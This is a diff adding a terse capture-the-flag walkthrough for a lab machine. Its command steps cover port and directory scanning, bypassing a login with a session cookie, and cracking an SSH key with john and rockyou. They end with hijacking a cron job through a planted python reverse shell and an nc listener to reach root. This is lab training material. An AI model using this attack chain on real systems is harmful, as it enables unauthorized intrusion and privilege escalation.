@@ -1,0 +1,12 @@
+1 - nmap -A -p- 10.10.24.75
+2 - gobuster dir -u http://10.10.24.75/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+3 - view-source://http://10.10.24.75/login.js
+4 - F12 -> Cookie -> Name: SessionToken, Refresh (F5)
+5 - ssh2john id_rsa > hash
+6 - john hash -w=/usr/share/wordlists/rockyou.txt
+7 - ssh -i id_rsa james@10.10.24.75
+8 - cat user.txt
+9 - cat /etc/crontab
+10 - mkdir downloads, mkdir src, touch buildscript.sh -> python reverse shell, python -m http.server
+11 - nc -lvnp 4444
+12 - cat /root/root.txt
